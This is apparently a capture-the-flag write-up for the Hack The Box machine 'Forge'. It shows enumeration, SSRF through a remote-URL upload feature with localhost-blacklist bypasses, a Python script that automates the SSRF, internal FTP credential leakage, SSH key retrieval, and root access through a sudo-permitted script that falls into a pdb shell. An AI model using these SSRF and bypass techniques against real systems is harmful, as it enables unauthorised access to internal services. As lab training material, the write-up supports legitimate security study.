![](forge_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
</p>

# Enumeration

**IP-ADDR:** 10.10.11.111 forge.htb

**nmap scan:**
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

http server redirect to: `forge.htb`

![](screenshots/web-page.png)

Webapp have only file upload funcanility

![](screenshots/upload-page.png)

There are 2 options for file uploading.
* Local file from filesystem.
* Remote file form a url.

And uploaded file are stored in the `/uploads/` direcotry with random file name withut any file extension. Only images get renders and all other file renders as plain text.

# Foothold

## SSRF

file upload from remote url looks interesting.
* There is a hidden parameter `remote` in url-file-upload post request contains value `1`.
* server feching urls with python requests module, get form nc listener.

      curl -s -X 'POST' --data-binary 'url=http://127.1:21/&remote=1' 'http://forge.htb/upload'

  ![](screenshots/server-url-req.png)

* localhost is blacklisted but can be bypasswd with `127.1` and this can lead to SSRF(?).
* for bad urls server throughing errors and that way we can do port scan on local host.
* hostname `forge.htb` is also blocked but can be bypassed by using uppercase character: `FORGE.htb`

Running Intruder to bruteforce port and found ftp server port `21`.
```bash
❯ curl -s -X 'POST' --data-binary 'url=http://127.1:21&remote=1' 'http://forge.htb/upload' | grep '<strong>'
<strong>An error occured! Error : ('Connection aborted.', BadStatusLine("220 Forge's internal ftp server\r\n"))</strong>
```

but `ftp://` protocol is not allowed from url parameter.
```bash
❯ curl -s -X 'POST' --data-binary 'url=ftp://127.1:21&remote=1' 'http://forge.htb/upload' | grep '<strong>'
<strong>Invalid protocol! Supported protocols: http, https</strong>
```

still nothing can do with information.

Fuzzing for subdomain, found `admin.forge.htb`.
```bash
❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -H "Host: FUZZ.forge.htb" -u http://10.10.11.111 -ac -v -c

# ... [snip] ...

[Status: 200, Size: 27, Words: 4, Lines: 2, Duration: 617ms]
| URL | http://10.10.11.111
    * FUZZ: admin
```

But admin only accessable from localhost
```bash
❯ curl -s http://admin.forge.htb
Only localhost is allowed!
```

But we can access it with ssrf from `url` parameter in `/upload` and view response from uploaded file in `/uploads/` directory.

Little python script to automate file upload and read.
```py
import re
import sys
import html
import requests as r

url = 'http://forge.htb/upload'


def ssrf(ssrf_url):
    data = {'url': f'http://{ssrf_url}', 'remote': 1}
    rspn = r.post(url, data=data)
    if 'File uploaded successfully' in rspn.text:
        ssrf_rspn_file = re.findall(r'href="(.*?)"', rspn.text)[4]
        ssrf_rspn = r.get(ssrf_rspn_file)
        print(ssrf_rspn.text)
    else:
        error = re.findall(r'<strong>(.*?)</strong>', rspn.text)[0]
        print(html.unescape(error))


ssrf('127.0.0.1')
# ssrf(sys.argv[1])
```

With ssrf we Get access to admin panel.
```html
❯ python ssrf.py admin.FORGE.htb
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

There are 2 endpoints in admin subdomain `/announcements` and `/upload`.

Got some interesting information from `/announcements`. 
```html
❯ python ssrf.py 'admin.FORGE.htb/announcements'
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

* Ftp creds: `user:heightofsecurity123!`
* admin `/upload` allows ftp protocol.
* and fileupload from admin `/upload` can be done with `/upload?u=<url>`

So we can now access to ftp server from admin `/upload` endpoint with `/upload?u=ftp://user:heightofsecurity123!@127.1:21`.

And get ftp share.
```bash
❯ python ssrf.py 'admin.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@127.1:21'
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Sep 23 04:17 user.txt
```

This is an user's home directory. Try to get ssh key

![](screenshots/user-ssh.png)

Get "User" shell on the box with ssh key.

# Privesc

## Python pdb Module

User have some sudo rights
```bash
user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

This script have 2 interesting things

![](screenshots/python-pdb.png)

One is a passowrd `secretadminpassword` for connecting to the socket. Another is a exception `pdb.post_mortem(e.__traceback__)`

[pdb](https://docs.python.org/3/library/pdb.html): The module pdb defines an interactive source code debugger for Python programs.

And this exception occurs if socket quit unintended way.

Run script with sudo and connect to the socket from another terminal, Enter passowrd then `Ctrl+c`, This will drop script to pdb shell where we can run system command with python `os` module as root.

![](screenshots/rooted.png)
